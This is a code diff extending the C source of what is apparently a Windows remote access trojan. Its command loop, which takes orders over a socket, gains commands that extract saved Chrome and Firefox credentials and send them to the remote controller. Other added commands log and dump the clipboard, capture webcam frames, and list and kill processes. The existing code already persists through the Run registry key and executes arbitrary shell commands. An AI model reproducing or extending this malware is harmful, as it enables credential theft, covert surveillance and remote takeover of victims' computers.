@@ -13,6 +13,11 @@
 #include "logger.h"
 #include "screen.h"
 #include "str_cut.h"
+#include "wol.h"
+#include "process.h"
+#include "clipboard.h"
+#include "browser.h"
+#include "webcam.h"
 
 // Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
 
@@ -123,7 +128,22 @@ void Shell()
       sprintf(suc, "[+] File %s uploaded successfully on `%s`.\n", filename, getenv("COMPUTERNAME"));
       send(sock, suc, sizeof(suc), 0);
     }
-    // ADD NEW FEATURE HERE
+    else if (strncmp("wol:", buffer, 4) == 0)
+    {
+      // Extract MAC address after "wol:"
+      char *mac = buffer + 4;
+      char response[128];
+
+      if (send_magic_packet(mac) == 0)
+      {
+        sprintf(response, "[+] WOL magic packet sent to %s\n", mac);
+      }
+      else
+      {
+        sprintf(response, "[-] Failed to send WOL packet. Check MAC format (AA:BB:CC:DD:EE:FF)\n");
+      }
+      send(sock, response, sizeof(response), 0);
+    }
     else if (strncmp("info", buffer, 4) == 0)
     {
       // Handle new feature
@@ -258,6 +278,145 @@ void Shell()
       // Persist connection
       bootRun();
     }
+    else if (strcmp("ps", buffer) == 0)
+    {
+      // List all running processes
+      char *procs = list_processes();
+      if (procs != NULL)
+      {
+        send(sock, procs, strlen(procs), 0);
+        free(procs);
+      }
+      else
+      {
+        send(sock, "[-] Failed to list processes\n", 30, 0);
+      }
+    }
+    else if (strncmp("kill:", buffer, 5) == 0)
+    {
+      // Kill process by PID
+      DWORD pid = atoi(buffer + 5);
+      char response[128];
+
+      if (kill_process(pid) == 0)
+      {
+        sprintf(response, "[+] Process %lu terminated successfully\n", pid);
+      }
+      else
+      {
+        sprintf(response, "[-] Failed to terminate process %lu (check PID or permissions)\n", pid);
+      }
+      send(sock, response, sizeof(response), 0);
+    }
+    else if (strcmp("clipboard:start", buffer) == 0)
+    {
+      // Start clipboard monitor thread
+      HANDLE thread = CreateThread(NULL, 0, clipboard_monitor, NULL, 0, NULL);
+      if (thread != NULL)
+      {
+        char *logpath = get_clipboard_logpath();
+        char response[256];
+        sprintf(response, "[+] Clipboard monitor started. Logging to: %s\n", logpath);
+        send(sock, response, strlen(response), 0);
+        free(logpath);
+      }
+      else
+      {
+        send(sock, "[-] Failed to start clipboard monitor\n", 40, 0);
+      }
+    }
+    else if (strcmp("clipboard:dump", buffer) == 0)
+    {
+      // Get current clipboard contents
+      char *contents = get_clipboard_contents();
+      if (contents != NULL)
+      {
+        send(sock, contents, strlen(contents), 0);
+        free(contents);
+      }
+      else
+      {
+        send(sock, "[-] Failed to get clipboard contents\n", 39, 0);
+      }
+    }
+    else if (strcmp("browser:creds", buffer) == 0)
+    {
+      // Extract all browser credentials
+      char *creds = extract_all_credentials();
+      if (creds != NULL)
+      {
+        send(sock, creds, strlen(creds), 0);
+        free(creds);
+      }
+      else
+      {
+        send(sock, "[-] Failed to extract credentials\n", 36, 0);
+      }
+    }
+    else if (strcmp("browser:chrome", buffer) == 0)
+    {
+      // Extract Chrome credentials only
+      char *creds = extract_chrome_credentials();
+      if (creds != NULL)
+      {
+        send(sock, creds, strlen(creds), 0);
+        free(creds);
+      }
+      else
+      {
+        send(sock, "[-] Failed to extract Chrome credentials\n", 43, 0);
+      }
+    }
+    else if (strcmp("browser:firefox", buffer) == 0)
+    {
+      // Extract Firefox credentials only
+      char *creds = extract_firefox_credentials();
+      if (creds != NULL)
+      {
+        send(sock, creds, strlen(creds), 0);
+        free(creds);
+      }
+      else
+      {
+        send(sock, "[-] Failed to extract Firefox credentials\n", 44, 0);
+      }
+    }
+    else if (strcmp("webcam", buffer) == 0)
+    {
+      // Capture webcam frame
+      char BASE_PATH[256];
+      sprintf(BASE_PATH, "C:\\Users\\%s\\AppData\\Local\\Temp\\webcam", getenv("USERNAME"));
+      mkdir(BASE_PATH);
+
+      char *UUID = generate_uuid();
+      char WEBCAM_FILE[256];
+      sprintf(WEBCAM_FILE, "%s\\%s.bmp", BASE_PATH, UUID);
+
+      if (capture_webcam_frame(WEBCAM_FILE) == 0)
+      {
+        char suc[256];
+        sprintf(suc, "[+] Webcam frame saved to: %s\n", WEBCAM_FILE);
+        send(sock, suc, strlen(suc), 0);
+      }
+      else
+      {
+        send(sock, "[-] Webcam capture failed (no device or not implemented)\n", 58, 0);
+      }
+    }
+    else if (strcmp("webcam:list", buffer) == 0)
+    {
+      // List webcam devices
+      char *devices = list_webcam_devices();
+      if (devices != NULL)
+      {
+        send(sock, devices, strlen(devices), 0);
+        free(devices);
+      }
+      else
+      {
+        send(sock, "[-] Failed to list webcam devices\n", 35, 0);
+      }
+    }
     else
     {
       // Open a file description to execute system commands
@@ -310,28 +469,6 @@ int EstablishConnection(const char *ServerIp, unsigned short ServerPort)
   return 0; // Connection established successfully
 }
 
-// Receive the magic packet
-void WOL()
-{
-  // Use PowerShell to enable WOL
-  char pws_script[] = "powershell set-executionpolicy -executionpolicy Bypass -Force\n"
-                    "if (-not ((Get-WmiObject win32_bios).Manufacturer -like \"Dell*\")){\n"
-                    "Write-host \"Command must be run against a Dell computer\" exit 1\n"
-                    "}\n"
-                    "if (-not (Get-Module -ListAvailable -Name DellSMBios)){\n"
-                    "Install-Module -Name DellBiosProvider -Force\n"
-                    "}\n"
-                    "Import-Module DellBiosProvider\n"
-                    "if(Test-Path dellsmbios:\\PowerManagement\\WakeOnLan){\n"
-                    "Set-Item -Path dellsmbios:\\PowerManagement\\WakeOnLan LANOnly\n"
-                    "}\n"
-                    "else{\n"
-                    "Write-host \"Computer does not support WakeOnLAN\"\n"
-                    "}";
-  // Enable the rights
-  system("powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass");
-  system(pws_script);
-}
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
 {
@@ -367,8 +504,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     return 1;
   }
 
-  // Enable WOL
-  WOL();
+  // Enable WOL (multi-vendor support)
+  enable_wol();
 
   // Enter into Shell
   Shell();
